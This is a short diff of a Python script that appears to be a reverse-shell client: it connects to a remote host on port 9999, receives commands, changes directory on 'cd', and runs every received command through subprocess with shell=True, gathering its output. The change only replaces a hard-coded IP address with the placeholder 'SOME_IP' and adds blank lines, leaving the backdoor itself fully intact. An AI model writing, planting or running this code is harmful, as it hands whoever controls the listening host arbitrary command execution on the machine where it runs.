@@ -3,16 +3,18 @@ import os
 import subprocess
 
 s = socket.socket()
-host = '169.254.56.175'
+host = 'SOME_IP'
 port = 9999
 s.connect((host, port))
 
 
 while True:
     data = s.recv(1024)
+    
     # if it's a 'cd' command
     if data[:2].decode("utf-8") == 'cd':
         os.chdir(data[3:].decode("utf-8"))
+    
     if len(data) > 0:
         cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
         output_byte = cmd.stdout.read() + cmd.stderr.read()
